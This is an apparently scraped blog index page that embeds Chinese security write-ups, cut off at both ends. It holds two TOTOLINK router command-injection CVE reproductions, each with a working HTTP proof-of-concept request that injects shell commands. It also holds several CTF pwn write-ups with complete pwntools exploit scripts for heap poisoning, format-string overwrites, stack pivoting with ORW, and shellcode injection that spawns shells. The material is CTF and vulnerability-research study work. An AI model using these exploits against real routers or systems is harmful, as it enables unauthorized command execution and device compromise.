#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">SharkCTF 部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MPIXkmDvQ/"" data-c="
          &lt;h3 id=&#34;概述&#34;&gt;&lt;strong&gt;概述&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;TOTOLINK A7000R V9.1.0u.6115_B20201022 版本存在安全漏洞，该漏洞源于 &lt;code&gt;setDiagnosisCfg&lt;/code&gt; 的 ip 参数存在命令注入问题&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html&#34;&gt;下载链接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞&#34;&gt;&lt;strong&gt;漏洞&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/cgi-bin/cstecgi.cgi&lt;/code&gt;的&lt;code&gt;setDiagnosisCfg&lt;/code&gt; 从请求中获取&lt;code&gt;ip&lt;/code&gt;参数并通过&lt;code&gt;sprintf&lt;/code&gt;函数将参数格式化拼接在变量&lt;code&gt;acStack_90&lt;/code&gt;后，最后将&lt;code&gt;acStack_90&lt;/code&gt;传入&lt;code&gt;doSystem&lt;/code&gt;函数中&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691497823589.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;grep -rnl &amp;quot;doSystem&amp;quot;&lt;/code&gt;递归查找相关文件&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498085539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
锁定&lt;code&gt;libcshared.so&lt;/code&gt;动态链接库文件查找函数实现&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498379028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以看到该函数将参数&lt;code&gt;param1&lt;/code&gt;通过&lt;code&gt;vnsprintf&lt;/code&gt;函数格式化后存储到&lt;code&gt;acStack_20c&lt;/code&gt;中最后传入&lt;code&gt;system&lt;/code&gt;函数中，可以导致任意命令执行&lt;/p&gt;
&lt;h3 id=&#34;复现&#34;&gt;&lt;strong&gt;复现&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;首先配置网络：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # 创建网桥
sudo ifconfig virbr2 192.168.122.1/24 up # 配置网桥IP
sudo tunctl -t tap2 # 添加虚拟网卡tap2
sudo ifconfig tap2 192.168.122.11/24 up # 配置虚拟网卡IP
sudo brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;提取固件后进入&lt;code&gt;/squashfs-root/bin/&lt;/code&gt;下执行&lt;code&gt;readelf -h busybox&lt;/code&gt;查看相关信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF 头：
  Magic：  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  类别:                              ELF32
  数据:                              2 补码，小端序 (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI 版本:                          0
  类型:                              EXEC (可执行文件)
  系统架构:                          MIPS R3000
  版本:                              0x1
  入口点地址：              0x402c80
  程序头起点：              52 (bytes into file)
  Start of section headers:          607496 (bytes into file)
  标志：             0x70001007, noreorder, pic, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         25
  Section header string table index: 24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;32位mips小端序，这里使用qemu-system模式创建虚拟机模拟固件，注意指定较新的cpu，以免出现&lt;code&gt;illegal instruction&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 74Kf \
-m 2G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;创建成功后root/root登录，虚拟机执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up # 配置路由器IP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;方便起见，我们找到配置文件&lt;code&gt;/lighttpd/lighttpd.conf&lt;/code&gt;并将指定pid文件那一行注释掉，后续不用单独创建&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691499443007.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后host执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/ # 拷贝路由器文件到虚拟机
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行以下命令挂载路由器并启动服务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 

/usr/sbin/lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib    #-m指定动态链接库所在文件夹
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499467495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
成功启动服务后验证&lt;br&gt;
POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /cgi-bin/cstecgi.cgi HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 26
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: 192.168.122.15
Origin: http://192.168.122.15
Proxy-Connection: keep-alive
Referer: http://192.168.122.15/login.html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
X-Requested-With: XMLHttpRequest

{&amp;quot;ip&amp;quot;:&amp;quot;;ls;&amp;quot;,&amp;quot;topicurl&amp;quot;:&amp;quot;setDiagnosisCfg&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499526940.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2022-37083 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dvNDl3Egy/"" data-c="
          &lt;h3 id=&#34;概述&#34;&gt;&lt;strong&gt;概述&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;TOTOLINK T6_Firmware V5.9c.4085_B20190428存在一个任意命令执行漏洞，位于&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;中&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/190/ids/36.html&#34;&gt;下载链接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞&#34;&gt;&lt;strong&gt;漏洞&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;漏洞点出现在&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;程序中main函数中&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691426998868.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
程序通过获取请求参数将参数传递给变量&lt;code&gt;v14&lt;/code&gt;，之后再通过&lt;code&gt;sprintf&lt;/code&gt;将参数格式化拼接在变量&lt;code&gt;v24&lt;/code&gt;后&lt;br&gt;
未被过滤的&lt;code&gt;v24&lt;/code&gt;传入&lt;code&gt;system&lt;/code&gt;函数，进而导致任意命令执行&lt;/p&gt;
&lt;h3 id=&#34;复现&#34;&gt;&lt;strong&gt;复现&lt;/strong&gt;：&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;提取固件后进入&lt;code&gt;squashfs-root&lt;/code&gt;目录下执行&lt;code&gt;readelf -h ./bin/busybox&lt;/code&gt;查看架构等相关信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF 头：
  Magic：  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  类别:                              ELF32
  数据:                              2 补码，小端序 (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI 版本:                          0
  类型:                              EXEC (可执行文件)
  系统架构:                          MIPS R3000
  版本:                              0x1
  入口点地址：              0x403bc0
  程序头起点：              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  标志：             0x70001005, noreorder, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;确定为mipsel后采用qemu的system模式模拟&lt;br&gt;
首先配置网络，将以下内容写入文件后source即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # 创建网桥
sudo ifconfig virbr2 192.168.122.1/24 up # 配置网桥IP
sudo tunctl -t tap2 # 添加虚拟网卡tap2
sudo ifconfig tap2 192.168.122.11/24 up # 配置虚拟网卡IP
sudo brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提前下载好镜像和虚拟磁盘&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;amp;&amp;amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后启动虚拟机&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 24KEc \
-m 1G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虚拟机启动成功后root/root进入，此时配置虚拟机网络&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;方便起见，先将&lt;code&gt;lighttp/lighttpd.conf&lt;/code&gt;中的pid一行注释掉，后续就不用单独创建&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691427943479.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此时通过&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/&lt;/code&gt;将文件系统传输到虚拟机上&lt;br&gt;
如果报错&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp: realpath /root/squashfs-root: No such file
scp: upload &amp;quot;/root/squashfs-root&amp;quot;: path canonicalization failed
scp: failed to upload directory squashfs-root to /root
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;记得加&lt;code&gt;-O&lt;/code&gt;就行了&lt;br&gt;
传输完成后挂载路由器系统并启动web服务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 
/bin/lighttpd -f /lighttp/lighttpd.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时遇到报错&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428131035.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
则需要指定动态链接库，加上后变成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以成功启动服务&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428266952.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
POC：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /cgi-bin/downloadFlile.cgi?cmd=`ls&amp;gt;../cmd4.txt` HTTP/1.1
Host: 192.168.122.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-None-Match: &amp;quot;-1779788291&amp;quot;
If-Modified-Since: Mon, 07 Aug 2023 14:09:36 GMT
Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691428986394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691429278253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">CVE-2022-25084 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SmeektZkD/"" data-c="
          &lt;p&gt;glibc 2.27 3 1.4&lt;br&gt;
没有uaf&lt;br&gt;
add中存在逻辑漏洞，分配大小大于0x400堆块不成功，可以修改edit时的nbytes并返回菜单&lt;br&gt;
后续可以越界写&lt;br&gt;
add：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215851632.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
edit：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215971440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./baige&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28702)
elf=ELF(&amp;quot;./baige&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x100,b&amp;quot;a&amp;quot;)

add(8,0x100,b&amp;quot;b&amp;quot;) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(i,0x100,&amp;quot;d&amp;quot;)

add(0,0x10,b&amp;quot;a&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x131-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
add(0,0xe0,b&amp;quot;a&amp;quot;)

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f432

add(1,0x100,b&amp;quot;d&amp;quot;)
add(2,0x100,b&amp;quot;d&amp;quot;)
add(3,0x100,b&amp;quot;d&amp;quot;)
delete(3)
delete(2)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(1))
io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(0x421))

edit(1,0x118,cyclic(0x108)+p64(0x101)+p64(free_hook))

add(4,0x100,b&amp;quot;q&amp;quot;)
add(5,0x100,b&amp;quot;q&amp;quot;)
edit(5,0x20,p64(shell))

delete(1)
    
io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[长安杯 2021学生组]baige wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mjK5Vthuj/"" data-c="
          &lt;p&gt;格式化字符串任意地址覆盖&lt;br&gt;
glibc 2.31-9.7&lt;br&gt;
main函数返回地址和&lt;code&gt;call sub_13F7&lt;/code&gt;只差1字节&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1690885652464.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一次劫持ret到此处并且泄露libc&lt;br&gt;
第二次覆盖ret地址值为one_gadget即可&lt;br&gt;
注意随机数每一次都要重新生成，不要写在if里面，不然出错&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28642)
elf=ELF(&amp;quot;./service&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.31.so&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

# gdb.attach(io)
# pause()

io.sendafter(b&amp;quot;name:\n&amp;quot;,b&amp;quot;a&amp;quot;*0x109)
io.recvuntil(b&amp;quot;a&amp;quot;*0x109)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;+hex(canary))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

cs.srand(0x61616161)

def game():
    io.recvuntil(b&amp;quot;: \n&amp;quot;)
    num=cs.rand()%3
    if num==1:
        io.sendline(b&amp;quot;2&amp;quot;)
    if num==2:
        io.sendline(b&amp;quot;0&amp;quot;)
    if num==0:
        io.sendline(b&amp;quot;1&amp;quot;)

for i in range(100):
    game()

ret_addr=stack_addr-0x218

payload=&amp;quot;%{}c%{}$hhn.%9$p.&amp;quot;.format(0x3e,8).encode()+p64(ret_addr)
#向偏移为8处存储ret_addr并覆盖ret_addr地址处数据低字节`\x43`为`\x3e`从而返回vuln
#同时泄露libc地址

io.sendafter(b&amp;quot;you.\n&amp;quot;,payload)

io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-175-libc.sym[b&amp;quot;printf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
shell=leak_addr+0xe3b31

payload=fmtstr_payload(6,{ret_addr:shell})
io.send(payload)
#修改ret_addr为one_gadget

io.interactive()

# 0xe3b2e execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b31 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b34 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">[虎符CTF 2022]babygame wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/nQxaOOZy1/"" data-c="
          &lt;h3 id=&#34;love&#34;&gt;love:&lt;/h3&gt;
&lt;p&gt;格式化字符串泄露canary和libc&lt;br&gt;
官方给的是覆盖TLS上的canary，因为使用了gets&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28310)
# io=process(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

# gdb.attach(io)
# pause()

pop_rdi=0x4013f3
ret=0x40101a

io.recvuntil(b&amp;quot;Toka\n\n&amp;quot;)
# payload=&amp;quot;%15$p.%17$p.%486c%9$n&amp;quot;  #520-18-14-2   
payload=&amp;quot;%520c%9$n.%15$p.%17$p&amp;quot;
io.send(payload)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]-243
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
sh_addr=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

payload=cyclic(0x28)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
io.sendlineafter(b&amp;quot;vel\n\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rbp&#34;&gt;rbp:&lt;/h3&gt;
&lt;p&gt;栈迁移+orw：&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./rbp&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28341)
elf=ELF(&amp;quot;./rbp&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401353
leave_ret=0x40121d
read_text=0x401292
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

payload=cyclic(0x210)+p64(0x404910)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)


payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401270)
payload=payload.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404910-0x210)+p64(leave_ret)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92

# gdb.attach(io)
# pause()

payload=cyclic(0x210)+p64(0x404498)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)

#open
orw=b&amp;quot;/flag\x00\x00\x00&amp;quot;+p64(pop_rdi)+p64(0x404288)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(write_a)

orw=orw.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404490-0x208)+p64(leave_ret)
io.send(orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xor&#34;&gt;xor：&lt;/h3&gt;
&lt;p&gt;存在xor每次只能异或一个字节，但是最开始有flag判断&lt;br&gt;
flag初值为0，函数进入条件小于等于0&lt;br&gt;
需要通过第一次异或将flag的符号位覆盖为0xff即可绕过&lt;br&gt;
后面向rwx段写shellcode，最后劫持&lt;code&gt;fini_array&lt;/code&gt;指针到shellcode处即可&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28981)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def xorenc(addr,val):
    io.sendlineafter(b&amp;quot;addr: &amp;quot;,addr)
    io.sendlineafter(b&amp;quot;value: &amp;quot;,val)    

# gdb.attach(io)
# pause()

pop_rdi=0x2a3e5 
flag=0x600bcc
fini_array=0x600970
sc_addr=0x600d00  # xor 0x400610  20 0B10

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;)
xorenc(hex(fini_array).encode(),b&amp;quot;0x10&amp;quot;)
xorenc(hex(fini_array+1).encode(),b&amp;quot;0x0b&amp;quot;)
xorenc(hex(fini_array+2).encode(),b&amp;quot;0x20&amp;quot;)

shellcode=asm(shellcraft.sh())
for i in range(len(shellcode)):
    xorenc(hex(sc_addr+i),hex(shellcode[i]).encode())

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;) #trigger

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;read_file&#34;&gt;read_file:&lt;/h3&gt;
&lt;p&gt;第一次输入远端除去含&lt;code&gt;flag&lt;/code&gt;字串的文件名使得&lt;code&gt;file_flag&lt;/code&gt;为真从而能进入read_file函数&lt;br&gt;
远端&lt;code&gt;flag.txt&lt;/code&gt; 8字节可以让&lt;code&gt;file_fd&lt;/code&gt;覆盖为0，使fd=0，read从键盘输入&lt;br&gt;
read_file里面输入length时调用&lt;code&gt;alloca()&lt;/code&gt;在栈上分配空间，使得后续可以栈溢出&lt;br&gt;
此时file_name为&lt;code&gt;flag.txt&lt;/code&gt;，通过load_file函数加上偏移直接跳转到&lt;br&gt;
&lt;code&gt;file_fd = open(file_name, 0, 0LL);&lt;/code&gt;从而绕过&lt;code&gt;flag&lt;/code&gt;字串判断&lt;br&gt;
第一个&lt;code&gt;ret&lt;/code&gt;使得程序正常跳转到最read_file，第二个&lt;code&gt;ret&lt;/code&gt;平衡栈&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28565)

load_text=0x401493
leak=0x4014ee
ret=0x40101a

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;.&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;flag.txt&amp;quot;)


io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;read more \n&amp;quot;)

gdb.attach(io)
pause()

